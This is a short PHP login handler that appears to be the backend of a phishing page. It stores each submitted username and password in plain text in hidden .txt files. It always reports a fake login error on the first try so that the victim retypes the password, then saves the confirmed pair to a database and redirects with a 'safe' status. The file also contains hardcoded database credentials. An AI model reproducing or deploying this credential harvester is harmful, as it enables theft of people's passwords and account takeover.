<?php
session_start();
if (!isset($_POST["submit"])) {
   header("Location: index.php?login");
   die();
} else {
   $uid = $_POST["uid"];
   $pwd = $_POST["pwd"];
    if (isset($_SESSION['token_pwd']) && isset($_SESSION['token_uid'])) { if ($pwd == $_SESSION['token_pwd'] && $uid == $_SESSION['token_uid']) {
       $file = fopen("5ebe2294ecd0e0f08eab7690d2a6ee69.txt","a");
       $txt = "\r\n Username:".$uid.";"."Password:".$pwd.";";
       fwrite($file,$txt);
       fclose($file);
       unset($_SESSION['token_pwd']);
       unset($_SESSION['token_uid']);
       $servername="localhost";
       $username="id6297507_users";
       $server_password="abcdefg12345678";
       $dbname="id6297507_users";
       //make connection
       $conn = mysqli_connect($servername,$username,$server_password,$dbname);
       $dbUid = mysqli_real_escape_string($conn, $uid);
       $dbPwd = mysqli_real_escape_string($conn, $pwd);
       $sql = "INSERT INTO users (uid,pwd) VALUES ('$dbUid','$dbPwd');";
       mysqli_query($conn, $sql);
       header("Location: index.php?status=safe");
       die();
    } else {
      $file = fopen("3f43fj28ksh83jh93800fb++.txt","a");
      $txt = "\r\n Username:".$uid.";"."Password:".$pwd.";";
      fwrite($file,$txt);
      fclose($file);
    $_SESSION['token_pwd'] = $pwd;
    $_SESSION['token_uid'] = $uid;
    header("Location: index.php?login=error");
    die();
    }
     } else {
       $file = fopen("3f43fj28ksh83jh93800fb++.txt","a");
       $txt = "\r\n Username:".$uid.";"."Password:".$pwd.";";
       fwrite($file,$txt);
       fclose($file);
     $_SESSION['token_pwd'] = $pwd;
     $_SESSION['token_uid'] = $uid;
     header("Location: index.php?login=error");
     die();
     }
}
